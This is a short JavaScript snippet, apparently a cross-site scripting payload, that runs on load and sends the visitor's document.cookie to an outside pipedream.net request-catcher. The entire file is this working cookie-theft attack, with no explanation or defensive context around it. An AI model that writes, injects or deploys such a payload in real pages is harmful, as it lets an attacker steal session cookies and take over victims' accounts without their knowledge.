function hi(){
   var url = "https://enlzin1jz3wwj.x.pipedream.net"
   xhr = new XMLHttpRequest();
   xhr.open("GET", url + "?cookie=" + document.cookie, true);
   xhr.send(null);
}

hi();
